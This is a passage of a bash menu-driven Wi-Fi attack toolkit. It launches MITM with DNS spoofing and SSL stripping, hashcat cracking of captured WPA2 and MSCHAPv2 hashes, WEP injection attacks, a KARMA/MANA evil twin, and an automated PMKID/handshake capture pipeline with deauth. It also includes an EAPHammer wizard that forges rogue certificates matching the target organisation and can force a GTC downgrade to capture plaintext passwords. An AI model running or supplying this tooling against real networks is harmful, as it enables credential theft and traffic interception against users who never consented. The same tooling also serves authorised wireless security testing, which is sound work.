        "dns" "  DNS Spoofing    — redirect all DNS queries" "OFF" \
        "ssl" "  SSL Stripping   — downgrade HTTPS to HTTP"  "OFF" \
        3>&1 1>&2 2>&3) || return

    TAB_MITM_DNS="no"; TAB_MITM_SSL="no"
    [[ "$opts" == *"dns"* ]] && TAB_MITM_DNS="yes"
    [[ "$opts" == *"ssl"* ]] && TAB_MITM_SSL="yes"

    local tab_name="MITM:${SELECTED_IFACE}"
    spawn_tab "$tab_name" "tab_bettercap_mitm" || return
    notify_tab_launched "$tab_name"
}

hashcat_crack() {
    draw_banner

    dialog --title " Crack Hashes — Overview " \
           --msgbox "\
\n  HOW IT WORKS\
\n  ────────────────────────────────────────────────────\
\n  Runs hashcat on previously captured hash files.\
\n  Supports WPA2/WPA3 handshakes (.hc22000) and\
\n  Enterprise MSCHAPv2 hashes (eap_creds.log).\
\n\
\n  RECOMMENDED ATTACK ORDER\
\n  1) Wordlist (fastest — try rockyou.txt first)\
\n     Good for common passwords set by users\
\n  2) Wordlist + Rules (mutations)\
\n     Adds leet-speak, caps, appended digits\
\n  3) Common Masks (pattern-based)\
\n     Keyboard walks, dates (Summer2023!)\
\n  4) Full Pipeline (all of the above, sequential)\
\n     Only if time is not a constraint\
\n\
\n  TIP\
\n  GPU cracking is 100-1000x faster than CPU.\
\n  If hashcat shows 'No devices found', check\
\n  GPU driver installation:  hashcat -I" \
           24 66
    [[ $? -ne 0 ]] && return

    if ! command -v hashcat &>/dev/null; then
        dialog --title " hashcat Not Found " \
               --msgbox "\n  hashcat is required for cracking.\n\n  Install:  apt install hashcat" \
               9 50
        return
    fi

    # Find all crackable files in OUTPUT_DIR
    local -a hash_files
    mapfile -t hash_files < <(
        find "$OUTPUT_DIR" -type f \
             \( -name "*.hc22000" -o -name "eap_creds*.log" \) \
             2>/dev/null | sort)

    if [[ ${#hash_files[@]} -eq 0 ]]; then
        dialog --title " No Hash Files Found " \
               --msgbox "\n  No .hc22000 or EAP credential files in:\n  $OUTPUT_DIR\n\n  Run a capture attack first:\n  - WPA2 Handshake / PMKID → .hc22000\n  - Enterprise EAP → eap_creds.log" \
               12 60
        return
    fi

    # Build file selection menu
    local menu_items=()
    local htype size rel
    for i in "${!hash_files[@]}"; do
        size=$(du -sh "${hash_files[$i]}" 2>/dev/null | cut -f1)
        rel="${hash_files[$i]#$OUTPUT_DIR/}"
        htype="WPA2 (m=22000)"
        [[ "${hash_files[$i]}" == *"eap_creds"* ]] && htype="MSCHAPv2 (m=5600)"
        menu_items+=("$i" "  [$size]  $rel  [$htype]")
    done

    local idx _hc_h _hc_th
    _hc_th=$(tput lines 2>/dev/null || echo 30)
    _hc_h=$(( ${#hash_files[@]} + 10 ))
    [[ $_hc_h -gt $(( _hc_th - 4 )) ]] && _hc_h=$(( _hc_th - 4 ))
    idx=$(dialog --title " Select Hash File to Crack " \
                 --menu "\n  Select file:" \
                 "$_hc_h" 78 8 \
                 "${menu_items[@]}" \
                 3>&1 1>&2 2>&3) || return

    TAB_HC_FILE="${hash_files[$idx]}"
    TAB_HC_HASH_TYPE="22000"
    [[ "$TAB_HC_FILE" == *"eap_creds"* ]] && TAB_HC_HASH_TYPE="5600"

    # Wordlist selection
    local wl_choice
    wl_choice=$(dialog --title " Wordlist " \
        --menu "\n  Select wordlist  (start with fasttrack, then rockyou):" \
        14 70 3 \
        "fasttrack"  "  fasttrack.txt — top 222 common PWs, finishes in seconds" \
        "rockyou"    "  rockyou.txt   — 14M passwords, 1-60 min on GPU" \
        "custom"     "  Custom path   — specify your own wordlist file" \
        3>&1 1>&2 2>&3) || return

    case "$wl_choice" in
        rockyou)   TAB_HC_WORDLIST="/usr/share/wordlists/rockyou.txt" ;;
        fasttrack) TAB_HC_WORDLIST="/usr/share/wordlists/fasttrack.txt" ;;
        custom)
            TAB_HC_WORDLIST=$(dialog --title " Custom Wordlist Path " \
                --inputbox "\n  Full path to wordlist:" \
                9 60 "" 3>&1 1>&2 2>&3) || return ;;
    esac

    # Auto-decompress rockyou if needed
    if [[ ! -f "$TAB_HC_WORDLIST" && -f "${TAB_HC_WORDLIST}.gz" ]]; then
        dialog --title " Decompressing " \
               --infobox "\n  Decompressing $(basename "$TAB_HC_WORDLIST").gz ..." 6 52
        gunzip -k "${TAB_HC_WORDLIST}.gz" 2>/dev/null || true
    fi

    if [[ ! -f "$TAB_HC_WORDLIST" ]]; then
        dialog --title " Wordlist Not Found " \
               --msgbox "\n  '$TAB_HC_WORDLIST' not found." 7 56
        return
    fi

    # Attack mode selection
    TAB_HC_MODE=$(dialog --title " Attack Mode " \
        --menu "\n  Select strategy  (start with wordlist — fastest):" \
        16 72 4 \
        "wordlist" "  Wordlist only   — fastest; try this first (seconds-minutes)" \
        "rules"    "  Wordlist+rules  — mutations: P@ssw0rd, Password1 (minutes)" \
        "mask"     "  Masks only      — Summer2023!, qwerty123 (minutes-hours)" \
        "full"     "  Full pipeline   — all modes sequential (hours, exhaustive)" \
        3>&1 1>&2 2>&3) || return

    local tab_name
    tab_name="Crack:$(basename "$TAB_HC_FILE" | cut -c1-22)"
    spawn_tab "$tab_name" "tab_hashcat_crack" || return
    notify_tab_launched "$tab_name"
}

# ────────────────────────────────────────────────────────────
#  FEATURE 13 LAUNCHER: WEP Attack Suite
# ────────────────────────────────────────────────────────────
wep_attack() {
    draw_banner
    require_target || return

    if [[ "${TARGET_ENC^^}" != *"WEP"* ]]; then
        dialog --title " Wrong Encryption " \
               --msgbox "\n  Target '${TARGET_SSID}' is not WEP-encrypted.\n\n  Current encryption: ${TARGET_ENC}\n\n  Select a WEP target first (Scan → item 1, then pick a WEP AP)." \
               10 60
        return
    fi

    SELECTED_IFACE=$(pick_interface "Select injection-capable interface:") || return

    TAB_WEP_METHOD=$(dialog --title " WEP Attack Method " \
        --menu "\n  Select injection method:\n" \
        14 68 4 \
        "auto"     "  Auto (recommended) — try ARP, fallback frag, fallback chopchop" \
        "arp"      "  ARP Replay         — fastest; requires an active client" \
        "frag"     "  Fragmentation      — works without clients; needs short packets" \
        "chopchop" "  ChopChop           — alternative clientless method" \
        3>&1 1>&2 2>&3) || return

    local iv_input
    iv_input=$(dialog --title " IV Threshold " \
        --inputbox "\n  Minimum IVs before cracking attempt:\n  (default: 15000; use 5000 for 64-bit WEP)" \
        9 56 "$TAB_WEP_IV_THRESHOLD" \
        3>&1 1>&2 2>&3) || return
    [[ "$iv_input" =~ ^[0-9]+$ ]] && TAB_WEP_IV_THRESHOLD="$iv_input"

    local tab_name="WEP:${TARGET_SSID:0:18}"
    spawn_tab "$tab_name" "tab_wep_attack" || return
    notify_tab_launched "$tab_name"
}

# ────────────────────────────────────────────────────────────
#  FEATURE 14 LAUNCHER: KARMA/MANA Evil Twin
# ────────────────────────────────────────────────────────────
karma_attack() {
    draw_banner

    if ! find_hostapd_wpe; then
        dialog --title " hostapd-wpe Not Found " \
               --msgbox "\n  hostapd-wpe is required for the KARMA/MANA Evil Twin attack.\n\n  Install it with:\n    apt install hostapd-wpe\n  or:\n    git clone https://github.com/aircrack-ng/hostapd-wpe\n\n  Cannot continue without hostapd-wpe." \
               13 66
        return
    fi

    SELECTED_IFACE=$(pick_interface "Select interface for rogue AP:") || return

    TAB_KARMA_MODE=$(dialog --title " KARMA Mode " \
        --menu "\n  Select rogue AP authentication mode:\n" \
        12 60 2 \
        "open" "  Open — no authentication (captures all probes)" \
        "wpa"  "  WPA2-PSK — rogue PSK AP (captures WPA handshakes)" \
        3>&1 1>&2 2>&3) || return

    TAB_KARMA_CHANNEL=$(dialog --title " Channel " \
        --inputbox "\n  Channel for rogue AP (1-13 for 2.4GHz, 36-165 for 5GHz):" \
        9 58 "${TARGET_CHANNEL:-6}" \
        3>&1 1>&2 2>&3) || return

    if [[ "$TAB_KARMA_MODE" == "wpa" ]]; then
        TAB_KARMA_PSK=$(dialog --title " Rogue PSK " \
            --inputbox "\n  Enter PSK for rogue WPA2 AP (blank for none):" \
            9 58 "" \
            3>&1 1>&2 2>&3) || return
    else
        TAB_KARMA_PSK=""
    fi

    TAB_KARMA_SSIDS=$(dialog --title " SSID Filter " \
        --inputbox "\n  SSIDs to respond to (comma-separated) or 'any' for all probes:" \
        9 66 "any" \
        3>&1 1>&2 2>&3) || return

    local tab_name="KARMA Evil Twin"
    spawn_tab "$tab_name" "tab_karma_attack" || return
    notify_tab_launched "$tab_name"
}

# ────────────────────────────────────────────────────────────
#  FEATURE 15 LAUNCHER: Auto Attack Pipeline
# ────────────────────────────────────────────────────────────
auto_attack_pipeline() {
    draw_banner
    require_target || return

    if [[ -z "$TARGET_BSSID" ]]; then
        dialog --title " No Target Set " \
               --msgbox "\n  No target BSSID set.\n\n  Run Scan (option 1) and select a target first." \
               9 52
        return
    fi

    SELECTED_IFACE=$(pick_interface "Select injection-capable interface:") || return

    TAB_AUTO_MODE=$(dialog --title " Pipeline Mode " \
        --menu "\n  Select attack pipeline mode:\n" \
        13 68 3 \
        "both"       "  Both — PMKID first, handshake fallback (recommended)" \
        "pmkid"      "  PMKID only — clientless, faster (may not work on all APs)" \
        "handshake"  "  Handshake only — requires active client; sends deauth" \
        3>&1 1>&2 2>&3) || return

    TAB_AUTO_WORDLIST=$(dialog --title " Wordlist Path " \
        --inputbox "\n  Path to wordlist file for hashcat:\n  (default: /usr/share/wordlists/rockyou.txt)" \
        9 68 "/usr/share/wordlists/rockyou.txt" \
        3>&1 1>&2 2>&3) || return

    TAB_AUTO_CRACK_MODE=$(dialog --title " Crack Mode " \
        --menu "\n  Select hashcat compute mode:\n" \
        12 60 3 \
        "auto" "  Auto — let hashcat choose (recommended)" \
        "cpu"  "  CPU only  (-D 1)" \
        "gpu"  "  GPU only  (-D 2)" \
        3>&1 1>&2 2>&3) || return

    local tab_name="Auto:${TARGET_SSID:0:18}"
    spawn_tab "$tab_name" "tab_auto_pipeline" || return
    notify_tab_launched "$tab_name"
}

# ────────────────────────────────────────────────────────────
#  ENTERPRISE CONFIG PARSER
# ────────────────────────────────────────────────────────────
conf_get() {
    local section="$1" key="$2" in_section=0 k v
    while IFS="=" read -r k v; do
        k="${k// /}"
        v="${v%%#*}"
        v="${v#"${v%%[![:space:]]*}"}"
        v="${v%"${v##*[![:space:]]}"}"
        [[ "$k" =~ ^\[(.+)\]$ ]] && {
            [[ "${BASH_REMATCH[1]}" == "$section" ]] && in_section=1 || in_section=0
            continue
        }
        [[ $in_section -eq 1 && "$k" == "$key" ]] && { echo "$v"; return; }
    done < "$ENTERPRISE_CONF"
}

# ────────────────────────────────────────────────────────────
#  ENTERPRISE CONFIG WRITER
#  Rewrites the entire eaphammer_enterprise.conf with new values.
# ────────────────────────────────────────────────────────────
conf_write_all() {
    local cn="$1"       country="$2"    state_="$3"    locale_="$4" \
          org="$5"      org_unit="$6"   email_="$7"  \
          negotiate="$8" wpa_version="$9" capture_hs="${10}" \
          phase1="${11}" phase2="${12}"
    cat > "$ENTERPRISE_CONF" << CONF
# ============================================================
#  EAPHammer Enterprise Attack — Non-Interactive Config
#  Used by wifi_pentest.sh to skip the cert wizard and
#  run credential harvesting without any prompts.
#
#  Edit the [cert] section once to match the target org's
#  cert profile (makes the rogue cert more convincing).
# ============================================================

# ────────────────────────────────────────────────────────────
#  [cert]  Self-signed certificate subject fields
#  These are passed to --cert-wizard create --self-signed
#  the first time the script runs. Once the cert is written
#  to /etc/eaphammer/certs/active/ it is reused automatically.
# ────────────────────────────────────────────────────────────
[cert]
cn=$cn
country=$country
state=$state_
locale=$locale_
org=$org
org_unit=$org_unit
email=$email_

# ────────────────────────────────────────────────────────────
#  [attack]  Enterprise EAP attack defaults
#
#  negotiate: EAP negotiation strategy
#    balanced     - PEAP/TTLS/TLS/FAST + GTC/MSCHAPv2 (default)
#    speed        - fastest convergence, MSCHAPv2 first
#    gtc-downgrade- force GTC to capture plaintext passwords
#    weakest      - most permissive, highest compat
#
#  wpa_version: 1 or 2
#
#  capture_wpa_handshakes: yes or no
#    Capture WPA handshakes alongside EAP creds (dual capture)
# ────────────────────────────────────────────────────────────
[attack]
negotiate=$negotiate
wpa_version=$wpa_version
auth=wpa-eap
capture_wpa_handshakes=$capture_hs

# ────────────────────────────────────────────────────────────
#  [eap_methods]  Phase 1 and Phase 2 methods
#  Only used when negotiate=manual.
#  Comma-separated, order determines priority.
# ────────────────────────────────────────────────────────────
[eap_methods]
phase1=$phase1
phase2=$phase2
CONF
}

# ────────────────────────────────────────────────────────────
#  EAP WIZARD — interactive pre-launch configurator
#  Replaces manual config-file editing for enterprise attacks.
#  Sets TAB_NEGOTIATE, TAB_WPA_VER, TAB_CAP_HS, TAB_PHASE1/2.
#  Sets _EAP_CERT_CHANGED=1 if cert fields were modified.
#  Returns 1 if the user cancelled at any step.
# ────────────────────────────────────────────────────────────
eap_wizard() {
    _EAP_CERT_CHANGED=0

    # ── Load current values as defaults ──────────────────────
    local cn;       cn=$(conf_get cert cn);                        cn="${cn:-wifi-pentest}"
    local country;  country=$(conf_get cert country);              country="${country:-US}"
    local state;    state=$(conf_get cert state);                  state="${state:-California}"
    local locale;   locale=$(conf_get cert locale);                locale="${locale:-San Francisco}"
    local org;      org=$(conf_get cert org);                      org="${org:-CorpNetwork}"
    local org_unit; org_unit=$(conf_get cert org_unit);            org_unit="${org_unit:-IT}"
    local email;    email=$(conf_get cert email);                  email="${email:-admin@corp.local}"
    local negotiate; negotiate=$(conf_get attack negotiate);       negotiate="${negotiate:-balanced}"
    local wpa_ver;   wpa_ver=$(conf_get attack wpa_version);      wpa_ver="${wpa_ver:-2}"
    local cap_hs;    cap_hs=$(conf_get attack capture_wpa_handshakes); cap_hs="${cap_hs:-no}"
    local phase1;    phase1=$(conf_get eap_methods phase1);        phase1="${phase1:-PEAP,TTLS,TLS,FAST}"
    local phase2;    phase2=$(conf_get eap_methods phase2);        phase2="${phase2:-GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS-PAP,MD5}"

    # Keep originals for cert-change detection
    local orig_cn="$cn" orig_country="$country" orig_state="$state" \
          orig_locale="$locale" orig_org="$org" orig_org_unit="$org_unit" \
          orig_email="$email"

    # ── Step 1/3: Certificate Profile ────────────────────────
    local form_out
    form_out=$(dialog \
        --title " EAP Wizard — Step 1/3: Certificate Profile " \
        --form "\
\n  These fields appear in the self-signed cert shown to clients.\
\n  Match the target org's profile to improve acceptance rates.\n" \
        22 68 9 \
        "CN (hostname):"    1 2 "$cn"       1 22 38 64 \
        "Country (2-char):" 2 2 "$country"  2 22 38 2  \
        "State:"            3 2 "$state"    3 22 38 64 \
        "City:"             4 2 "$locale"   4 22 38 64 \
        "Organization:"     5 2 "$org"      5 22 38 64 \
        "Org Unit:"         6 2 "$org_unit" 6 22 38 64 \
        "Email:"            7 2 "$email"    7 22 38 64 \
        3>&1 1>&2 2>&3) || return 1

    local form_vals=()
    mapfile -t form_vals <<< "$form_out"
    cn="${form_vals[0]}"
    country="${form_vals[1]}"
    state="${form_vals[2]}"
    locale="${form_vals[3]}"
    org="${form_vals[4]}"
    org_unit="${form_vals[5]}"
    email="${form_vals[6]}"

    # ── Step 2/3: Negotiate Strategy ─────────────────────────
    negotiate=$(dialog \
        --title " EAP Wizard — Step 2/3: Negotiate Strategy " \
        --default-item "$negotiate" \
        --menu "\n  How should the rogue AP negotiate EAP with clients?\n" \
        17 70 5 \
        "balanced"      "  PEAP/TTLS/TLS/FAST + GTC/MSCHAPv2  (recommended)" \
        "speed"         "  MSCHAPv2 first — fastest convergence" \
        "gtc-downgrade" "  Force GTC — captures plaintext passwords" \
        "weakest"       "  Most permissive — highest client compatibility" \
        "manual"        "  Manual — set Phase 1 & Phase 2 methods yourself" \
        3>&1 1>&2 2>&3) || return 1

    # Manual mode: collect phase 1 & 2 method lists
    if [[ "$negotiate" == "manual" ]]; then
        phase1=$(dialog \
            --title " EAP Wizard — Phase 1 (Outer) Methods " \
            --inputbox "\
\n  Outer EAP methods, comma-separated in priority order.\
\n  Options: PEAP, TTLS, TLS, FAST\n" \
            12 64 "$phase1" 3>&1 1>&2 2>&3) || return 1
        phase2=$(dialog \
            --title " EAP Wizard — Phase 2 (Inner) Methods " \
            --inputbox "\
\n  Inner EAP methods, comma-separated in priority order.\
\n  Options: GTC, MSCHAPV2, TTLS-MSCHAPV2, TTLS-PAP, MD5\n" \
            12 64 "$phase2" 3>&1 1>&2 2>&3) || return 1
    fi

    # ── Step 3/3: WPA Version & Handshake Capture ────────────
    wpa_ver=$(dialog \
        --title " EAP Wizard — Step 3/3: Attack Parameters " \
        --default-item "$wpa_ver" \
        --menu "\n  WPA version for the rogue Enterprise AP:\n" \
        11 56 2 \
        "2" "  WPA2-Enterprise  (most networks — recommended)" \
        "1" "  WPA-Enterprise   (older / legacy networks)" \
        3>&1 1>&2 2>&3) || return 1

    local hs_flag="--defaultno"
    [[ "$cap_hs" == "yes" ]] && hs_flag=""
    # shellcheck disable=SC2086
    dialog $hs_flag \
        --title " Capture WPA Handshakes? " \
        --yesno "\
\n  Also capture WPA handshakes alongside EAP credentials?\
\n\
\n  Yes — dual capture  (EAP creds + WPA handshakes)\
\n  No  — EAP credentials only  (default)" \
        11 60
    [[ $? -eq 0 ]] && cap_hs="yes" || cap_hs="no"

    # ── Persist updated values to conf file ───────────────────
    conf_write_all "$cn" "$country" "$state" "$locale" \
                   "$org" "$org_unit" "$email" \
                   "$negotiate" "$wpa_ver" "$cap_hs" \
                   "$phase1" "$phase2"

    # ── Update TAB_ vars for the upcoming attack tab ──────────
    TAB_NEGOTIATE="$negotiate"
    TAB_WPA_VER="$wpa_ver"
    TAB_CAP_HS="$cap_hs"
    TAB_PHASE1="$phase1"
    TAB_PHASE2="$phase2"

    # ── Detect cert field changes ─────────────────────────────
    if [[ "$cn"       != "$orig_cn"       || "$country"  != "$orig_country"  ||
          "$state"    != "$orig_state"    || "$locale"   != "$orig_locale"   ||
          "$org"      != "$orig_org"      || "$org_unit" != "$orig_org_unit" ||
          "$email"    != "$orig_email" ]]; then
        _EAP_CERT_CHANGED=1
    fi
}

# ────────────────────────────────────────────────────────────
#  CERT BOOTSTRAP  (runs once, skips wizard forever)
# ────────────────────────────────────────────────────────────
bootstrap_eap_cert() {
    if [[ -f "$EAP_ACTIVE_CERT" && -s "$EAP_ACTIVE_CERT" ]]; then
        return 0
    fi

    if [[ ! -f "$ENTERPRISE_CONF" ]]; then
        dialog --title " Config Not Found " \
               --msgbox "\n  $ENTERPRISE_CONF\n  not found. Cannot bootstrap cert." 9 60
        return 1
    fi

    local cn;       cn=$(conf_get cert cn)
    local country;  country=$(conf_get cert country)
    local state;    state=$(conf_get cert state)
    local locale;   locale=$(conf_get cert locale)
    local org;      org=$(conf_get cert org)
    local org_unit; org_unit=$(conf_get cert org_unit)
    local email;    email=$(conf_get cert email)

    dialog --title " Cert Bootstrap " \
           --infobox "\n  No certificate found. Creating self-signed cert.\n\n  CN : $cn  |  Org : $org\n\n  Runs once — cert is reused on all future launches." \
           11 62
    sleep 1

    local bootstrap_log="${TMPDIR_PT}/bootstrap.log"
    "$EAPHAMMER" \
        --cert-wizard create --self-signed \
        --cn "$cn" --country "$country" --state "$state" \
        --locale "$locale" --org "$org" \
        --org-unit "$org_unit" --email "$email" \
        &>"$bootstrap_log"

    if [[ -f "$EAP_ACTIVE_CERT" && -s "$EAP_ACTIVE_CERT" ]]; then
        dialog --title " Cert Ready " \
               --msgbox "\n  [OK]  Self-signed cert created.\n  $EAP_ACTIVE_CERT\n\n  Wizard will NOT run on future launches." \
               10 62
    else
        dialog --title " Cert Bootstrap Failed " \
               --msgbox "\n  Certificate creation failed.\n  Log: $bootstrap_log" 9 60
        return 1
    fi
}

# ────────────────────────────────────────────────────────────
#  EAPHAMMER HELPER
# ────────────────────────────────────────────────────────────
find_eaphammer() {
    # Search order:
    # 1. WiFiZer0_Tools/eaphammer/eaphammer   (local install by install.sh)
    # 2. WiFiZer0_Tools/eaphammer_wrapper.sh  (venv wrapper by install.sh)
    # 3. System PATH  (apt install eaphammer)
    # 4. /opt/eaphammer/eaphammer             (legacy manual install)
    local local_bin="${SCRIPT_DIR}/WiFiZer0_Tools/eaphammer/eaphammer"
    local local_wrapper="${SCRIPT_DIR}/WiFiZer0_Tools/eaphammer_wrapper.sh"
    EAPHAMMER=$(
        { [[ -x "$local_bin"     ]] && echo "$local_bin";     } \
        || { [[ -x "$local_wrapper" ]] && echo "$local_wrapper"; } \
        || command -v eaphammer 2>/dev/null \
        || { [[ -x "/opt/eaphammer/eaphammer" ]] && echo "/opt/eaphammer/eaphammer"; } \
        || echo "")
    if [[ -z "$EAPHAMMER" ]]; then
        dialog --title " EAPHammer Not Found " \
               --msgbox "\
\n  eaphammer not found.\n\
\n  Run the installer to set it up automatically:\n\
\n    sudo bash install.sh\n\
\n  Or install manually:\n\
\n    apt install eaphammer\n\
\n  Expected local path:\n    ${local_bin}" \
               15 60
        return 1
    fi
}

# ────────────────────────────────────────────────────────────
#  VIEW RUNNING TASKS  — shows tmux windows + background PIDs
# ────────────────────────────────────────────────────────────
view_running_tasks() {
    draw_banner

    local tmux_wins=""
    if [[ $TMUX_AVAILABLE -eq 1 ]]; then
        tmux_wins=$(tmux list-windows -F \
            "#[bold]Tab #I:#[nobold] #W  [#{window_panes} pane(s)]" 2>/dev/null)
    fi

    if [[ ${#RUNNING_TASKS[@]} -eq 0 && -z "$tmux_wins" ]]; then
        dialog --title " Running Tasks " \
               --msgbox "\n  No tasks currently running." 7 42
        return
    fi

    # Build combined list from RUNNING_TASKS + live tmux windows
    local checklist_items=()
    if [[ $TMUX_AVAILABLE -eq 1 ]]; then
        while IFS=: read -r win_idx win_rest; do
            win_idx="${win_idx// /}"
            [[ "$win_idx" == "0" ]] && continue   # skip Main window
            local win_name
            win_name=$(tmux list-windows -F "#{window_index}:#{window_name}" 2>/dev/null \
                       | awk -F: -v i="$win_idx" '$1==i{print $2}')
            checklist_items+=("win_${win_idx}" "  Tab #${win_idx}: ${win_name}" "OFF")
        done < <(tmux list-windows -F "#{window_index}:" 2>/dev/null)
    fi

    for pid in "${!RUNNING_TASKS[@]}"; do
        IFS='|' read -r label _log mon_val <<< "${RUNNING_TASKS[$pid]}"
        [[ "$mon_val" == tmux:* ]] && continue  # already listed above
        kill -0 "$pid" 2>/dev/null || { unset "RUNNING_TASKS[$pid]"; continue; }
        checklist_items+=("$pid" "  PID:$pid  $label" "OFF")
    done

    if [[ ${#checklist_items[@]} -eq 0 ]]; then
        dialog --title " Running Tasks " \
               --msgbox "\n  No active tasks." 7 42
        return
    fi

    local action
    action=$(dialog --title " Running Tasks " \
                    --menu "\n  Select an action:" \
                    12 58 3 \
                    "switch" "  Switch to a task tab" \
                    "kill"   "  Kill selected tasks" \
                    "list"   "  List all tabs (Ctrl+b w)" \
                    3>&1 1>&2 2>&3) || return

    case "$action" in
        switch)
            local selected
            selected=$(dialog --title " Switch to Tab " \
                              --menu "\n  Select tab to switch to:" \
                              $(( ${#checklist_items[@]} / 3 + 9 )) 62 8 \
                              "${checklist_items[@]}" \
                              3>&1 1>&2 2>&3) || return
            if [[ "$selected" == win_* ]]; then
                local idx="${selected#win_}"
                tmux select-window -t "$idx" 2>/dev/null || true
            fi
            ;;
        kill)
            local to_kill
            to_kill=$(dialog --title " Kill Tasks " \
                             --checklist "\n  Space to select, Enter to confirm:" \
                             $(( ${#checklist_items[@]} / 3 + 10 )) 65 8 \
                             "${checklist_items[@]}" \
                             3>&1 1>&2 2>&3) || return
            [[ -z "$to_kill" ]] && return
            dialog --title " Confirm Kill " \
                   --yesno "\n  Terminate the selected tasks?\n\n  Any in-progress captures will stop\n  and interfaces will be restored." \
                   10 52 || return
            local -a kill_items
            read -ra kill_items <<< "$to_kill"
            for item in "${kill_items[@]}"; do
                if [[ "$item" == win_* ]]; then
                    local idx="${item#win_}"
                    tmux kill-window -t "$idx" 2>/dev/null || true
                    unset "RUNNING_TASKS[$item]"
                else
                    kill "$item" 2>/dev/null || true
                    unset "RUNNING_TASKS[$item]"
                fi
            done
            dialog --title " Done " --msgbox "\n  Selected tasks terminated." 7 42
            ;;
        list)
            if [[ $TMUX_AVAILABLE -eq 1 ]]; then
                tmux choose-window 2>/dev/null || true
            fi
            ;;
    esac
}

# ────────────────────────────────────────────────────────────
#  VIEW OUTPUT FILES
# ────────────────────────────────────────────────────────────
view_output() {
    draw_banner

    if [[ ! -d "$OUTPUT_DIR" ]]; then
        dialog --title " No Output " \
               --msgbox "\n  Output directory not found.\n  Run an attack module first." 8 52
        return
    fi

    # ── Level 1: band directories (2.4GHz/ 5GHz/ dual/) + root ───
    local -a subdirs
    # Collect band-level dirs first (depth 1), then SSID-level dirs (depth 2)
    mapfile -t subdirs < <(find "$OUTPUT_DIR" -mindepth 1 -maxdepth 2 -type d \
                           2>/dev/null | sort)

    # Loose files at root (session reports, audit logs, DB files)
    local -a root_files
    mapfile -t root_files < <(find "$OUTPUT_DIR" -maxdepth 1 -type f \
                              2>/dev/null | sort)

    if [[ ${#subdirs[@]} -eq 0 && ${#root_files[@]} -eq 0 ]]; then
        dialog --title " No Output Files " \
               --msgbox "\n  No files in $OUTPUT_DIR yet.\n  Run an attack module first." 8 52
        return
    fi

    local menu_items=()
    for i in "${!subdirs[@]}"; do
        local dir="${subdirs[$i]}"
        local rel="${dir#${OUTPUT_DIR}/}"
        local n_files size
        n_files=$(find "$dir" -maxdepth 1 -type f 2>/dev/null | wc -l)
        size=$(du -sh "$dir" 2>/dev/null | cut -f1)
        # Visually indent SSID-level dirs under their band dir
        local depth="${rel//[^\/]/}"    # count slashes = depth-1
        local indent=""
        [[ ${#depth} -ge 1 ]] && indent="    "
        menu_items+=("d${i}" "  ${indent}[${size}  ${n_files} file(s)]  ${rel}/")
    done
    if [[ ${#root_files[@]} -gt 0 ]]; then
        menu_items+=("root" "  [-- session --]  Audit logs, DB files, session reports")
    fi

    local max_h=$(( $(tput lines 2>/dev/null || echo 24) - 4 ))
    local dlg_h=$(( ${#menu_items[@]} / 2 + 12 ))
    [[ $dlg_h -gt $max_h ]] && dlg_h=$max_h

    local idx
    idx=$(dialog \
        --title " Output — $(basename "$OUTPUT_DIR") " \
        --menu "\n  Captures are grouped by band (2.4GHz / 5GHz / dual)\n  Select a folder to browse:\n" \
        "$dlg_h" 84 12 \
        "${menu_items[@]}" \
        3>&1 1>&2 2>&3) || return

    # ── Level 3: files within the chosen folder ───────────────────
    local -a browse_files=()
    local browse_title=""
    if [[ "$idx" == "root" ]]; then
        browse_files=("${root_files[@]}")
        browse_title="Session / Database Files"
    else
        local dir_idx="${idx#d}"
        local chosen_dir="${subdirs[$dir_idx]}"
        mapfile -t browse_files < <(find "$chosen_dir" -maxdepth 1 -type f 2>/dev/null | sort)
        browse_title="${chosen_dir#${OUTPUT_DIR}/}"
    fi

    if [[ ${#browse_files[@]} -eq 0 ]]; then
        dialog --title " Empty " --msgbox "\n  No files found in this folder." 7 44
        return
    fi

    local file_items=()
    for j in "${!browse_files[@]}"; do
        local size; size=$(du -sh "${browse_files[$j]}" 2>/dev/null | cut -f1)
        file_items+=("$j" "  [${size}]  $(basename "${browse_files[$j]}")")
    done

    local fidx
    fidx=$(dialog \
        --title " ${browse_title} " \
        --menu "\n  Select a file to view:" \
        $(( ${#browse_files[@]} + 10 )) 80 14 \
        "${file_items[@]}" \
        3>&1 1>&2 2>&3) || return

    dialog --title " $(basename "${browse_files[$fidx]}") " \
           --textbox "${browse_files[$fidx]}" 24 80
}

# ────────────────────────────────────────────────────────────
#  VIEW AP & CLIENT DATABASE  — browse all previously seen APs
# ────────────────────────────────────────────────────────────
view_ap_database() {
    draw_banner

    if [[ -z "$AP_DB" || ! -f "$AP_DB" ]] || \
       [[ $(grep -c '^[^#]' "$AP_DB" 2>/dev/null) -eq 0 ]]; then
        dialog --title " AP Database Empty " \
               --msgbox "\n  No APs in database yet.\n\n  Run a scan first to populate the database." \
               9 52
        return
    fi

    # ── Band filter ──────────────────────────────────────────────
    local db_band_filter
    db_band_filter=$(dialog --no-tags \
        --title " Filter by Band " \
        --menu "\n  Show access points on:" \
        12 50 3 \
        "all"   "  All bands (2.4 GHz + 5 GHz)" \
        "2.4"   "  2.4 GHz only  (channels 1-14)" \
        "5"     "  5 GHz only    (channels 36-165)" \
        3>&1 1>&2 2>&3) || return

    # ── Load AP database entries (with band column) ──────────────
    local -a db_bssids db_ssids db_channels db_bands db_encs db_auths db_powers db_times
    local db_bssid db_ssid db_ch db_band db_enc db_auth db_pwr db_ts
    while IFS=$'\t' read -r db_bssid db_ssid db_ch db_band db_enc db_auth db_pwr db_ts; do
        [[ "$db_bssid" =~ ^# || -z "$db_bssid" ]] && continue
        # If DB was created before band column existed, derive it from channel
        if [[ -z "$db_enc" ]]; then
            # Old schema: bssid ssid ch enc auth pwr ts (no band)
            db_ts="$db_pwr"; db_pwr="$db_auth"; db_auth="$db_enc"
            db_enc="$db_band"
            local _ch_n="${db_ch//[^0-9]/}"
            db_band=$( [[ "$_ch_n" -ge 36 ]] 2>/dev/null && echo "5GHz" || echo "2.4GHz" )
        fi
        # Apply band filter
        case "$db_band_filter" in
            "2.4") [[ "$db_band" == "5GHz" ]] && continue ;;
            "5")   [[ "$db_band" == "2.4GHz" ]] && continue ;;
        esac
        db_bssids+=("$db_bssid")
        db_ssids+=("$db_ssid")
        db_channels+=("$db_ch")
        db_bands+=("$db_band")
        db_encs+=("$db_enc")
        db_auths+=("$db_auth")
        db_powers+=("$db_pwr")
        db_times+=("$db_ts")
    done < "$AP_DB"

    if [[ ${#db_bssids[@]} -eq 0 ]]; then
        dialog --title " AP Database " \
               --msgbox "\n  No APs found matching the selected band filter.\n\n  Try 'All bands' or run a scan on this band." 9 56
        return
    fi

